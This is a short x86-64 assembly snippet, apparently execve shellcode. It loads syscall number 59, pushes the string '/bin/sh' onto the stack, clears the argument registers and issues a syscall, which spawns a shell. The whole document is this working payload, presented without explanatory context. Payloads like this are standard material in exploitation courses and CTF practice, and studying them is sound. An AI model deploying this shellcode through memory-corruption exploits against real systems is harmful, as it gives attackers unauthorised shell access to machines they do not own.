;; rax = sys_execve
mov rax, 59
;; write /bin/sh @rsp
mov rsi, 0x0068732f6e69622f
mov [rsp], rsi
;; rdi = @/bin/sh
mov rdi, rsp
;; nullify the other args
xor rsi, rsi
xor rdx, rdx
;; trigger interrupt
syscall